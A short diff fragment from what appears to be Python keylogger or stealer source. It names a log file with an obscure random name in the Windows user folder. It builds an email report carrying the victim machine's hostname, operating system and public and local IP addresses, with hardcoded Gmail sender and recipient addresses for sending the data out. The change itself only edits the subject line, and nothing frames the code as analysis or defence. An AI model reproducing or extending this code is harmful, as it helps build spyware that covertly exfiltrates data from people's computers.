@@ -75,7 +75,7 @@ def checkIfHidden(file):
 
 # For better cross compatibility, log file is created in Documents
 log = f"C:\\Users\\{user}\\xc7dysLal.txt"
-subject = f'Log from {platform.node()} ({platform.system()}) IP: {public_ip()}{local_ip()}'
+subject = f'Log USER: {platform.node()} OS: {platform.system()} IP: {public_ip()}{local_ip()}'
 to = 'loglogsnd@gmail.com'
 sender = 'insanelogcompile@gmail.com'
 
